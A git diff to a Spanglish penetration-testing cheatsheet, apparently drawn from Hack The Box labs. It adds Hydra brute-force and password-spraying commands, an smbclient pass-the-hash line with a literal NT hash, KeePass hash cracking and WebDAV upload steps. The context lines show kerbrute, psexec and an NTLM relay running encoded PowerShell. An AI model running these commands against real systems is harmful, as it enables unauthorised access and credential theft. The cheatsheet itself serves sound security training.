@@ -8,6 +8,7 @@ Expect Spanglish, this is a cheatsheet.
 
 - [Misc Commands from Linux](#misc-commands-from-linux)
    - [Strings and files manipulation](#strings-and-files-manipulation)
+   - [Setting and uploading Files to  WebDAV Server](#webdav-server-related)
    - [Some Netcat (nc, nc.exe, ncat) commands](#some-netcat-nc-ncexe-ncat-commands)
    - [Wireshark Filters and pcap related](#wireshark-filters-and-pcap-related)
    - [Basic AF git commands](#basic-af-git-commands)
@@ -92,12 +93,20 @@ cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.
 # Ordenar por frecuencia y mostrar todas las IP's presentes en un fichero LOG
 cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
 
+# Editing a file (and saving only the edited file, not a copy), deleting *-d* all lines starting with 1 *^1*
+sed -i '/^1/d' demo.txt
+```
+
+[Back to top](#index)
+
+### WebDav Server Related
+
+```
 # Starting WebDAV server
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root <path_to_wherever>
 
 #Upload file to webdav server
 curl -X PUT <url> -T /path/to/local/file
-
 ```
 
 [Back to top](#index)
@@ -924,7 +933,6 @@ Recomendado [Tarlogic - ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/bl
 Recomendado [The Hacker Recipes - Kerberos - Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
 
 ```
-
 # Fuerza bruta a kerberos	
 kerbrute -domain <domai> -users <user_file> -passwords <password_file> -outputfile <output_file>
 
@@ -941,6 +949,7 @@ impacket-psexec <dominio>/<user>@servicio.domain.htb -k -no-pass
 
 # Pass the Hash	
 impacket-psexec -hashes "<hashes>" <username>@domain
+smbclient \\\\<ip_addr>\\<restricted_share_name> -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 
 # Buscar Delegación	
 impacket-findDelegation domain/username:password
@@ -960,6 +969,28 @@ impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass
 
 #NTLM Relay Attack
 sudo python /usr/local/bin/ntlmrelayx.py --no-http-server -smb2support -t <target_ip> -c "powershell -enc JABjAGwAaQ..."
+
+```
+
+[Back to top](#index)
+
+## BruteForce (Hydra)
+
+```
+# Bruteforce SSH
+sudo hydra -l george -P rockyou.txt ssh://<IP_ADDR> -s <PORT>
+
+# Bruteforce RDP (password spraying)
+hydra -L names.txt -p "SuperS3cure1337#" rdp://<IP_ADDR>
+
+# Bruteforce FTP
+hydra -L names.txt -P rockyou.txt ftp://<IP_ADDR>
+
+# Bruteforce Web Login GET-FORM (In this example, credentials are sent Base64 encoded inside HTTP Header 'Authorization: Basic cXdlcjpxd2Vy')
+hydra -l admin -P rockyou.txt -f 192.168.189.201 http-get /:A=BASIC
+
+# Bruteforce Web Login POST-FORM (must extract POST login parameters from burpsuite and adjust the following command. Also must check the invalid login message and adjust the *:Login failed. Invalid* part inserting the actual error message given by the web app.
+hydra -l user -P rockyou.txt <IP_ADDR> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 
 ```
 
@@ -1001,6 +1032,10 @@ hashcat -m 22951 -a 0 id_rsa.hash rockyou.txt   # $sshng$5$
 
 # Yescrypt hash cracking
 john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt
+
+# KeePass Password Manager MAster Password cracking from Database file
+keepass2john database.kdbx
+hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
 
 ```
 
